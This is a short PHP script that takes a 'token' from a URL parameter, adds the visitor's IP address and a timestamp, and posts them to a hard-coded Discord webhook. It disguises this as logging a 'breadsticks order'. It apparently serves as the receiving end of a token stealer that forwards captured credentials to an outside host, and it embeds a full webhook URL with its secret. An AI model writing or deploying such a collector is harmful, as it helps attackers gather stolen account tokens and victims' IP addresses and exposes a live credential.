<?php
$logFile = "breadsticks_purchase_list.db";
$logEntry->date = date('Y-m-d H:i:s');
$logEntry->ip = $_SERVER['REMOTE_ADDR'];
$logEntry->token = $_GET["t"] or die("\nbye:(");

$url = "https://discordapp.com/api/webhooks/413276274929303562/hZrdfDKNtRRcfzF78YyfKdYJzJKksMxw2RBjbTbHVlOSiL2EsuYd6547eoODAItzgCZW";

$data = array("content"=>("new breadsticks order received:\n" . json_encode($logEntry)), "user"=>"baker");

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
print "confirmed";